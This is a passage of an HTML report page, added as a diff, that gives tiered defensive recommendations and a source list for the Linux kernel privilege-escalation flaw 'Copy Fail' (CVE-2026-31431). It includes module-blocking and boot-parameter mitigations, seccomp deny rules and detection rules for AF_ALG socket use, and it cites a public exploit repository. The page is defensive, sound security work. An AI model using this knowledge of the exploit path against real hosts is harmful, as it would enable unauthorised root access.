+    <p class="pullquote-text">The window between discovery and weaponization has collapsed to hours. Attackers gain disproportionate benefit, and current patch cycles, response processes, and risk metrics were not built for this environment.</p>
+    <p class="pullquote-attr"><strong>The AI Vulnerability Storm: Building a Mythos-ready Security Program</strong> · CSA / SANS / OWASP GenAI / [un]prompted · 13 April 2026 · Source [11]</p>
+  </div>
+</section>
+
+<!-- RECOMMENDATIONS -->
+<section>
+  <div class="container">
+    <div class="eyebrow"><span class="eyebrow-num">08</span>Forward recommendations</div>
+    <h2 class="section-title reveal">Fourteen actions across three tiers.</h2>
+    <p class="section-lede reveal reveal-delay-1">Each one tied to a CWE / NIST / OWASP grounding and an ATT&amp;CK technique it disrupts. Tier 1 is this week. Tier 2 is this quarter. Tier 3 is leadership-level. Click any card for the full grounding.</p>
+
+    <!-- TIER 1 -->
+    <div class="tier-section">
+      <div class="tier-header">
+        <span class="tier-badge t1">Tier 1 · Immediate</span>
+        <h3 class="tier-title">This week. Configuration, alerting, access review.</h3>
+        <span class="tier-meta">5 actions</span>
+      </div>
+      <div class="rec-grid">
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 01</div>
+          <h4 class="rec-title">Apply the kernel patch on multi-tenant and untrusted-execution surfaces first</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>CWE-1188; NIST CSF 2.0 PR.PS</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>T1068 at the source</dd>
+              <dt>Grounding</dt><dd>Theori's published patch prioritization guidance [1]; CIS Controls v8 Control 7; Tenable's affected-version table [4]</dd>
+              <dt>Effort note</dt>
+              <dd class="effort">The work is well-defined: identify hosts on affected kernel versions, prioritize multi-tenant Linux → K8s/container clusters → CI runners → SaaS sandboxes → standard servers → workstations. The blocker is rarely <em>deciding</em> to patch; it's reboot orchestration on stateful or regulated workloads. Live kernel patching closes that gap where supported.</dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 02</div>
+          <h4 class="rec-title">Apply the interim mitigation where patches are not yet available</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>CWE-1188; NIST CSF 2.0 PR.PS</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>T1068 by removing the algif_aead module load path</dd>
+              <dt>Grounding</dt><dd>CERT-EU advisory [3]; copy.fail mitigation guidance [1]; oss-security refinements on CONFIG_CRYPTO_USER_API_AEAD=y [9]</dd>
+              <dt>Effort note</dt>
+              <dd class="effort">For module-based kernels, the published <span class="mono">echo "install algif_aead /bin/false"</span> works as documented. For built-in kernels (=y), use the community-discovered <span class="mono">initcall_blacklist=algif_aead_init</span> boot parameter. <strong>Test in a non-production environment first.</strong> Aaron Rainbolt's findings identified bluez, cryptsetup, iwd, stress-ng, rustc tests, firefox-esr as consumers — workload-specific behavior can vary.</dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 03</div>
+          <h4 class="rec-title">Deploy runtime detection for unexpected AF_ALG SEQPACKET socket creation</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>NIST CSF 2.0 DE.CM; MITRE ATT&amp;CK detection guidance for T1068</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>T1068 by converting the chain's mandatory first syscall into an alert</dd>
+              <dt>Grounding</dt><dd>Sysdig's published Falco rule [5]; Falco is a CNCF graduated project</dd>
+              <dt>Effort note</dt>
+              <dd class="effort">For environments running Falco, Sysdig Secure, Tetragon, or equivalent eBPF-based runtime detection, this is a rule-deploy operation — minutes to hours including tuning to whitelist legitimate AF_ALG users. For environments without runtime behavioral detection, this isn't Tier 1 — it goes in Tier 2.</dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 04</div>
+          <h4 class="rec-title">Add seccomp deny rule for socket(AF_ALG) to container and CI workloads</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>NIST CSF 2.0 PR.PS; NIST SP 800-190 §4.5</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>T1068 at the syscall layer; T1611 by closing the foothold path entirely</dd>
+              <dt>Grounding</dt><dd>CERT-EU explicit recommendation [3]; copy.fail recommendation for untrusted workloads [1]</dd>
+              <dt>Effort note</dt>
+              <dd class="effort">For platforms with custom seccomp profile capacity already in place, adding an AF_ALG deny rule is a profile update — small. For platforms still on default profiles, this becomes the prompt to introduce profile customization. AF_ALG is a path very few legitimate application workloads need; a deny rule is low-cost, high-value defense even after the kernel patch lands.</dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 05</div>
+          <h4 class="rec-title">Inventory hosts by trust posture and update patch prioritization tier accordingly</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>NIST CSF 2.0 ID.AM; CIS Controls v8 Control 1</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>Indirect — enables fast prioritization of every Copy-Fail-class disclosure that follows</dd>
+              <dt>Grounding</dt><dd>CSA AI Vulnerability Storm Priority Action 7 [11]; Theori's prioritization guidance [1]; CIS Control 1</dd>
+              <dt>Effort note</dt>
+              <dd class="effort">Tag every Linux host by trust posture — "executes untrusted code (multi-tenant, CI runner, SaaS sandbox, AI agent execution)" vs. "single-tenant, first-party only." For the first category, Copy Fail and every future class-similar bug is a Tier 1 emergency. Most organizations have host inventory; many do not have <em>trust-posture-tagged</em> host inventory. This week's work is to add the tag — even imperfectly.</dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+      </div>
+    </div>
+
+    <!-- TIER 2 -->
+    <div class="tier-section">
+      <div class="tier-header">
+        <span class="tier-badge t2">Tier 2 · Structural</span>
+        <h3 class="tier-title">This quarter. New controls, tooling, process redesign.</h3>
+        <span class="tier-meta">5 actions</span>
+      </div>
+      <div class="rec-grid">
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 06</div>
+          <h4 class="rec-title">Stand up triage and deployment capacity sized for continuous patching cadence</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>NIST CSF 2.0 GV.RM, PR.PS; CSA Priority Action 5</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>All — operational scaffolding for every disclosure response</dd>
+              <dt>Grounding</dt><dd>CSA AI Vulnerability Storm PA 5 — "Prepare for Continuous Patching" [11]; Risk #9 "Continuous VM Maturity Gap" at HIGH severity</dd>
+              <dt>Effort note</dt>
+              <dd class="effort">A 45 to 90-day investment. Concrete deliverables: documented patch staging and rollout playbooks per host class; pre-authorized maintenance windows for critical-severity disclosures; on-call coverage scaled to expected disclosure volume. Sized for <em>multiple simultaneous high-severity disclosures within the same week</em> — the load-test that 29 April actually delivered.</dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 07</div>
+          <h4 class="rec-title">Migrate untrusted-code-executing workloads to microVM, gVisor, or VM-level isolation</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>NIST CSF 2.0 PR.IR; NIST SP 800-190 §4.5</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>T1611 — structural elimination, not just patching</dd>
+              <dt>Grounding</dt><dd>AWS Firecracker; Google gVisor; Cloudflare V8 isolates; Bugcrowd analysis [7]</dd>
+              <dt>Effort note</dt>
+              <dd class="effort">Quarter-scale or longer architectural decision, scoped to workloads that genuinely execute untrusted code: multi-tenant container platforms running customer code, CI runners executing PRs from forks, AI agent sandboxes, SaaS notebook products. For each candidate: cost of migration vs. residual blast-radius cost of staying on shared-kernel containers. Bugcrowd: <em>"the boundaries that hold are the ones that don't share a kernel."</em></dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 08</div>
+          <h4 class="rec-title">Build out runtime behavioral detection coverage as a first-class capability</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>NIST CSF 2.0 DE.CM, DE.AE; CSA Priority Actions 9 &amp; 10</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>Detection coverage for T1068, T1611, and the broader class of syscall-anomaly LPEs that follow</dd>
+              <dt>Grounding</dt><dd>CSA Priority Action 9 (Deception) and 10 (Automated Response) [11]; Falco/Sysdig/Tetragon ecosystem</dd>
+              <dt>Effort note</dt>
+              <dd class="effort">90-day to 12-month program. The argument from Copy Fail: Sysdig customers had detection on disclosure day. Customers without runtime behavioral detection had coverage when EDR vendors shipped a signature — by definition lagging. Behavioral detection covers techniques (the unexpected AF_ALG SEQPACKET pattern <em>is</em> the technique) rather than CVEs.</dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 09</div>
+          <h4 class="rec-title">Operationalize coordinated disclosure intake (VDP)</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>NIST CSF 2.0 GV.OC; ISO/IEC 29147; CISA CVD guidance</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>Indirect — improves how external signals about your own vulnerabilities reach security teams</dd>
+              <dt>Grounding</dt><dd>ISO/IEC 29147 &amp; 30111; Bugcrowd commentary [7]: <em>"'We don't have a public security contact' is no longer a defensible posture"</em></dd>
+              <dt>Effort note</dt>
+              <dd class="effort">For organizations already running a VDP or bug bounty: tune intake capacity for the higher volume and quality of LLM-assisted submissions. For organizations without a security.txt: 30–60 day setup. The curl project, which once paused its bounty over hallucinated reports, now reports an increasing share of <em>quality</em> AI-supported findings.</dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 10</div>
+          <h4 class="rec-title">Use AI-assisted code review on high-risk subsystems before exposing them to users</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>OWASP LLM Top 10 (peripheral framing); CSA Priority Action 1; CWE-1188 prevention</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>Prevents future T1068-class bugs by catching them in development</dd>
+              <dt>Grounding</dt><dd>CSA Priority Action 1 (CRITICAL) [11]; Bugcrowd's commentary on order-of-magnitude cost shift [7]</dd>
+              <dt>Effort note</dt>
+              <dd class="effort">A 9-year-old kernel bug surfaced in ~1 hour given a researcher-supplied prompt. That cost asymmetry isn't only available to attackers. Use the same class of capability to scan internally-developed code that handles userspace-reachable interfaces. 45–90 day pilot for most enterprises. CSA paper: <em>"All code (human or AI-generated) should pass LLM-driven security review before merge."</em></dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+      </div>
+    </div>
+
+    <!-- TIER 3 -->
+    <div class="tier-section">
+      <div class="tier-header">
+        <span class="tier-badge t3">Tier 3 · Cultural / Governance</span>
+        <h3 class="tier-title">Leadership and organizational change. Decision rights, response maturity, sustainability.</h3>
+        <span class="tier-meta">4 actions</span>
+      </div>
+      <div class="rec-grid">
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 11</div>
+          <h4 class="rec-title">Update enterprise risk models to reflect the collapsed disclosure-to-weaponization window</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>NIST CSF 2.0 GV.RM, GV.OC; CSA Risk #5 "Cybersecurity Risk Model Outdated"</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>Indirect — gives the program the resourcing and authority to execute everything else</dd>
+              <dt>Grounding</dt><dd>CSA Priority Action 6 (CRITICAL, this week → 45 days) [11]</dd>
+              <dt>Effort note</dt>
+              <dd class="effort">A CISO-and-board conversation, not a tooling change. Concrete deliverable: refreshed risk register distinguishing <em>"vulnerability discovered, no public exploit"</em> from <em>"vulnerability discovered, working public exploit, distros backporting"</em> — Copy Fail is the latter. Board framing: this is not "the threat is unprecedented." It's "the cadence is changing; we're recalibrating the operating tempo and the resourcing that supports it."</dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 12</div>
+          <h4 class="rec-title">Establish a cross-functional Innovation &amp; Acceleration Governance mechanism</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>NIST CSF 2.0 GV.OC, GV.RM, GV.OV; CSA Risk #11</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>Indirect — removes approval friction that slows defensive AI adoption</dd>
+              <dt>Grounding</dt><dd>CSA Priority Action 4 (CRITICAL, this week → 6 months) [11]</dd>
+              <dt>Effort note</dt>
+              <dd class="effort">Organizations that route every novel control through quarterly governance review are structurally too slow for the disclosure-to-weaponization window. The recommendation is not "abandon governance" — it is "stand up a fast-path lane for time-sensitive defensive controls, with appropriate post-hoc review." Same-day deploy of a Falco rule, same-day decision on a community workaround, same-day patching prioritization across thousands of hosts — all require decision authority that exists <em>before</em> the disclosure lands.</dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 13</div>
+          <h4 class="rec-title">Build a permanent VulnOps function</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>NIST CSF 2.0 ID.RA, GV.RM; CSA Priority Action 11</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>All — long-term organizational capability for operating in the AI-Vuln-Storm regime</dd>
+              <dt>Grounding</dt><dd>CSA Priority Action 11 (CRITICAL, 6 months → 12 months) [11]</dd>
+              <dt>Effort note</dt>
+              <dd class="effort">A 6–12 month investment, scoped to organizations large enough to support it. The function owns: continuous AI-assisted scanning of first-party code, third-party dependency monitoring with automated triage, patch staging and rollout pipelines, and the response playbooks connecting external disclosure to internal action. Structural answer to Risk #9 "Continuous Vulnerability Management Maturity Gap"; long-horizon endpoint that Tier 2 recommendations build toward.</dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+        <article class="rec-card reveal" tabindex="0" role="button" aria-expanded="false">
+          <div class="rec-num">REC 14</div>
+          <h4 class="rec-title">Plan for staff sustainability under increased disclosure cadence</h4>
+          <div class="rec-detail">
+            <dl>
+              <dt>Addresses</dt><dd>CSA "The Human Cost" framing; NIST CSF 2.0 GV.RR</dd>
+              <dt>Disrupts ATT&amp;CK</dt><dd>Indirect — keeps the people who execute every other recommendation healthy enough to do so</dd>
+              <dt>Grounding</dt><dd>CSA AI Vulnerability Storm §IV [11]: <em>"Burnout and attrition in security functions represent a direct operational risk"</em></dd>
+              <dt>Effort note</dt>
+              <dd class="effort">29 April 2026 saw three significant disclosures land within 24 hours: Copy Fail, CVE-2026-3854 (88% of self-hosted GitHub servers exposed to RCE), and CVE-2026-32202 (active exploitation in Windows Shell). Multiplied across the calendar year, this cadence is the new baseline. The leadership response is not just hiring more headcount — it is building reserve capacity so experienced staff aren't burning out on every disclosure week, and making the program robust to losing any single person's institutional knowledge.</dd>
+            </dl>
+          </div>
+          <div class="rec-expand-row"><span>Expand</span></div>
+        </article>
+
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- FINAL CALLOUT -->
+<section>
+  <div class="container-narrow">
+    <div class="final-callout reveal">
+      <div class="final-eyebrow">The takeaway</div>
+      <p class="final-text">Copy Fail is one disclosure inside a structural shift. Enterprise patch cadence, host inventory, and isolation architecture were calibrated for a slower window. The work ahead is calibration to the new one — and the next disclosure will arrive before that work is finished.</p>
+    </div>
+  </div>
+</section>
+
+<!-- SOURCES & METHODOLOGY -->
+<section class="sources-section">
+  <div class="container">
+    <div class="eyebrow"><span class="eyebrow-num">09</span>Sources</div>
+    <h2 class="section-title">Citation index.</h2>
+    <p class="sources-frame">Every claim above traces back to one of the twelve sources below. Sources are grouped by type for readability; numbering corresponds to the inline citation index used throughout the report.</p>
+
+    <div class="sources-group">
+      <div class="sources-group-label">Primary disclosure</div>
+      <ul class="sources-list">
+        <li>
+          <span class="src-num">[1]</span>
+          <div class="src-body">
+            <span class="src-publisher">Theori / Xint Code</span> — <span class="src-title">copy.fail — primary disclosure site</span>
+            <div class="src-meta">29 April 2026 · <a class="src-link" href="https://copy.fail/" target="_blank" rel="noopener">copy.fail</a></div>
+          </div>
+        </li>
+        <li>
+          <span class="src-num">[2]</span>
+          <div class="src-body">
+            <span class="src-publisher">Xint Code Research Team</span> — <span class="src-title">Copy Fail: 732 Bytes to Root on Every Major Linux Distribution</span>
+            <div class="src-meta">29 April 2026 · technical writeup with root cause and operator prompt · <a class="src-link" href="https://xint.io/blog/copy-fail-linux-distributions" target="_blank" rel="noopener">xint.io/blog/copy-fail-linux-distributions</a></div>
+          </div>
+        </li>
+        <li>
+          <span class="src-num">[8]</span>
+          <div class="src-body">
+            <span class="src-publisher">oss-security mailing list</span> — <span class="src-title">CVE-2026-31431: CopyFail: linux local privilege escalation (Jan Schaumann, announcement)</span>
+            <div class="src-meta">29 April 2026, 16:23 EDT · <a class="src-link" href="https://www.openwall.com/lists/oss-security/2026/04/29/23" target="_blank" rel="noopener">openwall.com/lists/oss-security/2026/04/29/23</a></div>
+          </div>
+        </li>
+      </ul>
+    </div>
+
+    <div class="sources-group">
+      <div class="sources-group-label">Government / institutional CERT advisory</div>
+      <ul class="sources-list">
+        <li>
+          <span class="src-num">[3]</span>
+          <div class="src-body">
+            <span class="src-publisher">CERT-EU</span> — <span class="src-title">Security Advisory 2026-005: High Vulnerability in the Linux Kernel ("Copy Fail")</span>
+            <div class="src-meta">30 April 2026, 09:25 UTC · <a class="src-link" href="https://cert.europa.eu/publications/security-advisories/2026-005/" target="_blank" rel="noopener">cert.europa.eu/publications/security-advisories/2026-005</a></div>
+          </div>
+        </li>
+      </ul>
+    </div>
+
+    <div class="sources-group">
+      <div class="sources-group-label">Vendor research / detection engineering</div>
+      <ul class="sources-list">
+        <li>
+          <span class="src-num">[4]</span>
+          <div class="src-body">
+            <span class="src-publisher">Tenable Research Special Operations</span> (Satnam Narang) — <span class="src-title">Copy Fail (CVE-2026-31431): FAQ about Linux Kernel Privilege Escalation</span>
+            <div class="src-meta">30 April 2026 · stable kernel version mapping · <a class="src-link" href="https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation" target="_blank" rel="noopener">tenable.com</a></div>
+          </div>
+        </li>
+        <li>
+          <span class="src-num">[5]</span>
+          <div class="src-body">
+            <span class="src-publisher">Sysdig Threat Research</span> (Michael Clark) — <span class="src-title">CVE-2026-31431: "Copy Fail" Linux kernel flaw lets local users gain root in seconds</span>
+            <div class="src-meta">30 April 2026 · published Falco detection rule · <a class="src-link" href="https://www.sysdig.com/blog/cve-2026-31431-copy-fail-linux-kernel-flaw-lets-local-users-gain-root-in-seconds" target="_blank" rel="noopener">sysdig.com</a></div>
+          </div>
+        </li>
+      </ul>
+    </div>
+
+    <div class="sources-group">
+      <div class="sources-group-label">Independent journalist coverage</div>
+      <ul class="sources-list">
+        <li>
+          <span class="src-num">[6]</span>
+          <div class="src-body">
+            <span class="src-publisher">Help Net Security</span> (Zeljka Zorz) — <span class="src-title">Nine-year-old Linux kernel flaw enables reliable local privilege escalation (CVE-2026-31431)</span>
+            <div class="src-meta">30 April 2026 · Solar Designer Rocky Linux 9.7 confirmation · <a class="src-link" href="https://www.helpnetsecurity.com/2026/04/30/copyfail-linux-lpe-vulnerability-cve-2026-31431/" target="_blank" rel="noopener">helpnetsecurity.com</a></div>
+          </div>
+        </li>
+      </ul>
+    </div>
+
+    <div class="sources-group">
+      <div class="sources-group-label">Industry analyst commentary</div>
+      <ul class="sources-list">
+        <li>
+          <span class="src-num">[7]</span>
+          <div class="src-body">
+            <span class="src-publisher">Bugcrowd</span> (David Brumley, Chief AI &amp; Science Officer) — <span class="src-title">What we know about Copy Fail (CVE-2026-31431)</span>
+            <div class="src-meta">29 April 2026 · market-pricing context, container threat model framing · <a class="src-link" href="https://www.bugcrowd.com/blog/what-we-know-about-copy-fail-cve-2026-31431/" target="_blank" rel="noopener">bugcrowd.com</a></div>
+          </div>
+        </li>
+      </ul>
+    </div>
+
+    <div class="sources-group">
+      <div class="sources-group-label">Kernel community technical discussion</div>
+      <ul class="sources-list">
+        <li>
+          <span class="src-num">[9]</span>
+          <div class="src-body">
+            <span class="src-publisher">oss-security mailing list thread</span> — <span class="src-title">CVE-2026-31431 responses (Greg Kroah-Hartman, Eric Biggers, Sam James, Eddie Chapman, Solar Designer, Aaron Rainbolt, Zube)</span>
+            <div class="src-meta">29–30 April 2026 · workaround caveats and kernel community response · <a class="src-link" href="https://seclists.org/oss-sec/" target="_blank" rel="noopener">seclists.org/oss-sec/</a></div>
+          </div>
+        </li>
+        <li>
+          <span class="src-num">[10]</span>
+          <div class="src-body">
+            <span class="src-publisher">oss-security mailing list thread</span> — <span class="src-title">"Coordinated Disclosure in the LLM Age" (Jeremy Stanley, Greg Kroah-Hartman, Clemens Lang)</span>
+            <div class="src-meta">28–29 April 2026 · kernel maintainer view of LLM-age disclosure pressure · <a class="src-link" href="https://seclists.org/oss-sec/2026/q2/254" target="_blank" rel="noopener">seclists.org/oss-sec/2026/q2/254</a></div>
+          </div>
+        </li>
+      </ul>
+    </div>
+
+    <div class="sources-group">
+      <div class="sources-group-label">Industry consortium briefing (conceptual frame)</div>
+      <ul class="sources-list">
+        <li>
+          <span class="src-num">[11]</span>
+          <div class="src-body">
+            <span class="src-publisher">CSA / SANS / OWASP GenAI / [un]prompted</span> (Gadi Evron, Robert T. Lee, Rich Mogull, with contributing authors incl. Jen Easterly, Bruce Schneier, Heather Adkins, Rob Joyce, Phil Venables, Katie Moussouris, Sounil Yu) — <span class="src-title">The AI Vulnerability Storm: Building a Mythos-ready Security Program (v0.4)</span>
+            <div class="src-meta">13 April 2026 · <a class="src-link" href="https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/04/mythosready-20260413.pdf" target="_blank" rel="noopener">labs.cloudsecurityalliance.org/wp-content/uploads/2026/04/mythosready-20260413.pdf</a></div>
+          </div>
+        </li>
+      </ul>
+    </div>
+
+    <div class="sources-group">
+      <div class="sources-group-label">Independent third-party reproduction</div>
+      <ul class="sources-list">
+        <li>
+          <span class="src-num">[12]</span>
+          <div class="src-body">
+            <span class="src-publisher">rootsecdev</span> — <span class="src-title">cve_2026_31431 — non-destructive detector and alternate /etc/passwd-targeting LPE exploit</span>
+            <div class="src-meta">29–30 April 2026 · published within 24 hours of original disclosure · <a class="src-link" href="https://github.com/rootsecdev/cve_2026_31431" target="_blank" rel="noopener">github.com/rootsecdev/cve_2026_31431</a></div>
+          </div>
+        </li>
+      </ul>
+    </div>
+
+  </div>
+</section>
+
+<footer>
+  <p>Built by <a href="https://www.linkedin.com/in/kahalewai/" target="_blank" rel="noopener">Kahalewai</a>, Claude did the heavy lifting</p>
+</footer>
+
+</main>
+
+<script>
+// THEME TOGGLE
+const root = document.documentElement;
+const themeToggle = document.getElementById('themeToggle');
+const themeLabel = document.getElementById('themeLabel');
+
+function setTheme(t) {
+  root.setAttribute('data-theme', t);
+  themeLabel.textContent = t === 'dark' ? 'Light' : 'Dark';
+  try { localStorage.setItem('cf-theme', t); } catch(e) {}
+}
+
+try {
+  const saved = localStorage.getItem('cf-theme');
+  if (saved) setTheme(saved);
+} catch(e) {}
+
+themeToggle.addEventListener('click', () => {
+  const current = root.getAttribute('data-theme');
+  setTheme(current === 'dark' ? 'light' : 'dark');
+});
+
+// SCROLL REVEAL
+const revealEls = document.querySelectorAll('.reveal');
+const statCells = document.querySelectorAll('.stat-cell');
+
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('in-view');
+      observer.unobserve(entry.target);
+    }
+  });
+}, { threshold: 0.12, rootMargin: '0px 0px -50px 0px' });
+
+revealEls.forEach(el => observer.observe(el));
+statCells.forEach(el => observer.observe(el));
+
+// EXPANDABLE TIMELINE EVENTS
+document.querySelectorAll('.tl-content').forEach(el => {
+  el.addEventListener('click', () => {
+    const open = el.getAttribute('aria-expanded') === 'true';
+    el.setAttribute('aria-expanded', !open);
+  });
+  el.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault();
+      el.click();
+    }
+  });
+});
+
+// EXPANDABLE ATTACK CARDS
+document.querySelectorAll('.attack-card').forEach(el => {
+  el.addEventListener('click', () => {
+    const open = el.getAttribute('aria-expanded') === 'true';
+    el.setAttribute('aria-expanded', !open);
+  });
+  el.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault();
+      el.click();
+    }
+  });
+});
+
+// EXPANDABLE MITIGATION CARDS
+document.querySelectorAll('.mit-card').forEach(el => {
+  el.addEventListener('click', () => {
+    const open = el.getAttribute('aria-expanded') === 'true';
+    el.setAttribute('aria-expanded', !open);
+  });
+  el.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault();
+      el.click();
+    }
+  });
+});
+
+// EXPANDABLE RECOMMENDATION CARDS
+document.querySelectorAll('.rec-card').forEach(el => {
+  el.addEventListener('click', () => {
+    const open = el.getAttribute('aria-expanded') === 'true';
+    el.setAttribute('aria-expanded', !open);
+  });
+  el.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault();
+      el.click();
+    }
+  });
+});
+
+// SUPPORTING TECHNIQUES DROPDOWN
+document.querySelectorAll('.supporting-toggle').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const wrap = btn.closest('[data-supporting]');
+    const list = wrap.querySelector('.supporting-list');
+    const open = btn.getAttribute('aria-expanded') === 'true';
+    btn.setAttribute('aria-expanded', !open);
+    if (open) {
+      list.style.display = 'none';
+    } else {
+      list.style.display = 'grid';
+    }
+  });
+});
+
+// Hide supporting list initially
+document.querySelectorAll('.supporting-list').forEach(el => {
+  el.style.display = 'none';
+});
+</script>
+
+</body>
+</html>
